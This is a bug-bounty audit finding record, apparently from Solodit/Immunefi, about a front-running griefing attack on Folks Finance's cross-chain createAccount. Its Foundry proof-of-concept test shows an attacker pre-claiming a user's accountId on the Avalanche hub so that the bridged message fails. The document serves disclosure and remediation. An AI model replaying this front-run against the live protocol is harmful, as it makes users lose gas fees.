---
# Core Classification
protocol: Folks Finance
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 61017
audit_firm: Immunefi
contest_link: https://github.com/immunefi-team/Past-Audit-Competitions/blob/main/Folks%20Finance/Boost%20_%20Folks%20Finance%2033272%20-%20%5BSmart%20Contract%20-%20Medium%5D%20FrontRunning%20Attack%20on%20createAccount.md
source_link: https://github.com/immunefi-team/Past-Audit-Competitions/blob/main/Folks%20Finance/Boost%20_%20Folks%20Finance%2033272%20-%20%5BSmart%20Contract%20-%20Medium%5D%20FrontRunning%20Attack%20on%20createAccount.md
github_link: https://github.com/immunefi-team/Past-Audit-Competitions/blob/main/Folks%20Finance/Boost%20_%20Folks%20Finance%2033272%20-%20%5BSmart%20Contract%20-%20Medium%5D%20FrontRunning%20Attack%20on%20createAccount.md

# Impact Classification
severity: medium
impact: security_vulnerability
exploitability: 0.00
financial_impact: medium

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - cryptoticky
---

## Vulnerability Title

FrontRunning Attack on createAccount

### Overview


This report is about a bug found in a smart contract on the Ethereum network. The contract's target address is 0x16Eecb8CeB2CE4Ec542634d7525191dfce587C85. The bug can cause unbounded gas consumption and griefing, where an attacker can cause damage to users or the protocol without any profit motive. The bug occurs when an attacker creates an account with the same accountID as a user's message is in transit through the bridge. This results in the user losing gas fees for the transaction and additional gas fees for the bridge. The vulnerability is due to a lack of validation for the accountID in the SpokeCommon.createAccount and AccountManager.createAccount functions. The impact of this bug is significant, as the gas costs on the Ethereum network are much higher than on the Avalanche network. While the attacker may only incur minimal costs, the user could suffer losses between $5 and $10. The recommended solution is to set the accountID as the hash value of the user's address and nonce. A proof of concept is provided in the report to demonstrate the vulnerability.

### Original Finding Content




Report type: Smart Contract


Target: https://sepolia.etherscan.io/address/0x16Eecb8CeB2CE4Ec542634d7525191dfce587C85

Impacts:

* Unbounded gas consumption
* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

An attacker can cause a user's message to fail by creating an account with the same accountId while the createAccount message is in transit through the bridge. As a result, the user loses the gas fees incurred for the transaction and the additional gas fees used for the bridge.

## Vulnerability Details

AccountId is not validated in any format in SpokeCommon.createAccount and AccountManager.createAccount. AccountId is any value created by user. So attacker can copy the account id from the Ethereum network's transaction history and use it to create an account on the HubChain (Avalanche network). This is possible because there is a delay while the message through the bridge.

## Impact Details

Gas costs on the Ethereum network are significantly higher than on the Avalanche network. While an attacker may incur less than $0.1 in costs to carry out the attack, the user could suffer losses between $5 and $10.

## Recommendation

It is advisable to set the accountId as the hash value of the userAddress and nonce.

## Proof of concept

## Proof of Concept

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/PoC.sol";


interface ISpokeCommon {
    struct MessageParams {
        uint16 adapterId; // where to route message through
        uint16 returnAdapterId; // if applicable, where to route message through for return message
        uint256 receiverValue; // amount of value to attach for receive message
        uint256 gasLimit; // gas limit for receive message
        uint256 returnGasLimit; // if applicable, gas limit for return message
    }

    function createAccount(
        MessageParams memory params,
        bytes32 accountId,
        bytes32 refAccountId
    ) external payable;
}

contract FolksFinance is PoC {

    function setUp() virtual public {
        console.log("\n>>> Initial conditions");
    }

    function testCreateAccount() public {
        vm.createSelectFork("eth_testnet", 6322454);
        address user = vm.createWallet("user").addr;
        vm.startPrank(user);
        ISpokeCommon spokeCommon = ISpokeCommon(0x16Eecb8CeB2CE4Ec542634d7525191dfce587C85);
        ISpokeCommon.MessageParams memory params;
        params.adapterId = 2;
        params.returnAdapterId = 1;
        params.receiverValue = 0;
        params.gasLimit = 201817;
        params.returnGasLimit = 0;

        bytes32 accountId = bytes32(uint256(1));
        bytes32 refAccountId;

        spokeCommon.createAccount{value: 13828150600000000}(params, accountId, refAccountId);
        // User has to pay for gas cost for this tx and fee(the gasLimit for targetChain).

        vm.stopPrank();

        // An attacker can carry out a frontrunning attack
        // The attacker the accountId from the Ethereum network's transaction history and use it to create an account on the HubChain (Avalanche network).
        // This is possible because it takes over 10 seconds to complete the transaction through the bridge.
        vm.createSelectFork("avalanche_testnet", 34872103);
        spokeCommon = ISpokeCommon(0x6628cE08b54e9C8358bE94f716D93AdDcca45b00);
        params.adapterId = 1;
        params.returnAdapterId = 1;
        params.receiverValue = 0;
        params.gasLimit = 0;
        params.returnGasLimit = 0;

        accountId = bytes32(uint256(1));
        spokeCommon.createAccount(params, accountId, refAccountId);
        // Wormhole would send the message after the accountId is created and the tx would be failed.
    }
}
```


### Metadata

| Field | Value |
|-------|-------|
| Impact | MEDIUM |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Immunefi |
| Protocol | Folks Finance |
| Report Date | N/A |
| Finders | cryptoticky |

### Source Links

- **Source**: https://github.com/immunefi-team/Past-Audit-Competitions/blob/main/Folks%20Finance/Boost%20_%20Folks%20Finance%2033272%20-%20%5BSmart%20Contract%20-%20Medium%5D%20FrontRunning%20Attack%20on%20createAccount.md
- **GitHub**: https://github.com/immunefi-team/Past-Audit-Competitions/blob/main/Folks%20Finance/Boost%20_%20Folks%20Finance%2033272%20-%20%5BSmart%20Contract%20-%20Medium%5D%20FrontRunning%20Attack%20on%20createAccount.md
- **Contest**: https://github.com/immunefi-team/Past-Audit-Competitions/blob/main/Folks%20Finance/Boost%20_%20Folks%20Finance%2033272%20-%20%5BSmart%20Contract%20-%20Medium%5D%20FrontRunning%20Attack%20on%20createAccount.md

### Keywords for Search

`vulnerability`

